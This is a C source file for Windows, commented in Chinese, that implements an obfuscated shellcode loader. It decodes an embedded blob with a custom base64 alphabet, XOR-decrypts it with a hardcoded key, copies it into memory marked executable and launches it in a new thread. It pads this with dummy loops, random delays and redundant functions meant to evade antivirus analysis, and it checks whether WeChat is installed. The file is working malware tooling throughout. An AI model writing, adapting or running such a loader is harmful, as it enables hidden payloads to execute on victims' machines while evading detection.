#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static char base64_table[] = "Ag9jCXabcJKLV2345WmnopuvwxYZklMhi78NOPrstTUByz0defDEFGHI16+/QRSq";
static unsigned char shellcode[] = "dmIgeyhW/vJ7VaP8YIOn2Atv6uRC30T8mb07MGOzDv5vlg9/KZzYwHcrR8QcZiZ6No1An9th9r8ABCRs2dNjsE2fMv07MHb0AgTq34Co1Cie39irfgl9JNMDthT7V97/BSOGAits6HPPSmC5wnL+tiPRtvg+93i+sdPT0g+79umoZiZ6wL3t4wWDKS767nhvMETzprPGCMJhQWO7Duwnk998gIaN4HJzD8pMZEZTw4PP0aPBYIChLo4HZr2iK8gTYuP8UUGXAIncHvOE3aTi0jNA9TURHuTeseomAskAa9PgJgWddzRTQ1H5KnVUwV8A96tG3mjJtxikyHzR93DrYB/cwVizWe1FGhe2/K732Ni7kN7fO7UU5OaYPFeRMbQ8VvFxSrkwimHR6sSe1EUMQa9++HN/NFI6GQZF30NI582Bk5Iyta+SeajcSJpkozvQfKoHLb/a/eMCHLyEK8OJ6U1Hh/jj4Gj65NlBk5sy0HM23q8+4yqRy2cT4EAKThVxhq0vur7DkFXglocrlrXTS621ahTBOfsgCk4c/as/tsr7Rakw89ELGsSeSEBtDurJK49J3BIEzVC7jFPtYuWE5oCP58xHwozD3Iam3AorkxUvku61rek4hosVqH9SU+yYDVZM3rjEwgBywkmn26JHfywU9EgfM0IByljikVNyAAAA";
static char key[] = "AeB&79!ra0(3*)";

// 混淆后的解码函数
void obfuscated_base64_decode(unsigned char *input, unsigned char **output, int len) {
    if (len % 4 != 0) return;

    int output_len = len / 4 * 3;
    if (input[len - 1] == '=') output_len--;
    if (input[len - 2] == '=') output_len--;

    *output = (unsigned char *)malloc(output_len);
    if (*output == NULL) return;

    for (int i = 0, j = 0; i < len;) {
        int a = input[i] == '=' ? 0 : strchr(base64_table, input[i]) - base64_table;
        int b = input[i + 1] == '=' ? 0 : strchr(base64_table, input[i + 1]) - base64_table;
        int c = input[i + 2] == '=' ? 0 : strchr(base64_table, input[i + 2]) - base64_table;
        int d = input[i + 3] == '=' ? 0 : strchr(base64_table, input[i + 3]) - base64_table;

        (*output)[j++] = (a << 2) | (b >> 4);
        if (input[i + 2] != '=') (*output)[j++] = (b << 4) | (c >> 2);
        if (input[i + 3] != '=') (*output)[j++] = (c << 6) | d;

        i += 4;
    }
}

// 随机数生成
int generate_random_number() {
    return rand() % 100;
}

// 异或加解密
void xor_encrypt_decrypt(unsigned char *input, unsigned char *output, char *key, int len) {
    int key_length = strlen(key);
    for (int i = 0; i < len; i++) {
        output[i] = input[i] ^ key[i % key_length];
    }
    output[len] = '\0';
}

// 检测微信是否安装
int is_wechat_installed() {
    if (GetFileAttributes("C:\\Program Files (x86)\\Tencent\\WeChat") != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributes("C:\\Program Files\\Tencent\\WeChat") != INVALID_FILE_ATTRIBUTES) {
        return 1;
    }
    return 0;
}

// 冗余函数，增加复杂性
void redundant_function() {
    for (int i = 0; i < 10; i++) {
        generate_random_number();
    }
}

// 延迟函数
void delay_function() {
    Sleep(generate_random_number() * 10); // 随机延迟
}

// 动态执行函数
void (*dynamic_exec)(unsigned char*, unsigned char*, char*, int) = xor_encrypt_decrypt;

void excess_code() {
    if (is_wechat_installed() == 0) {
        printf("未通过微信检测");
    }
}

int main() {
    excess_code();
    unsigned char *decoded = NULL;
    void *exec_mem = NULL;
    unsigned char decrypted[2048];
    int shellcode_len = sizeof(shellcode) / sizeof(shellcode[0]) - 1;
    long long a = 0;
    long long b  = 1;
    long long c = 0;

    // 混淆代码段
    redundant_function();  // 增加冗余代码
    delay_function(); // 随机延迟

    obfuscated_base64_decode(shellcode, &decoded, shellcode_len);
    for(int i = shellcode_len / 4 * 3 - 1; i >= 0; i--){
        for(int j = 0; j <= generate_random_number(); j++){ // 动态混淆
            for(int k = 0; k <= generate_random_number(); k++){
                c = a + b;
                a = b;
                b = c;
            }
        }
        if (decoded[i] != '\x00') {
            exec_mem = VirtualAlloc(0, sizeof(decrypted), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            dynamic_exec(decoded, decrypted, key, i + 1); // 使用函数指针调用
            memcpy(exec_mem, decrypted, sizeof(decrypted));
            break;
        }
    }
    HANDLE hThread = CreateRemoteThread(GetCurrentProcess(), NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}
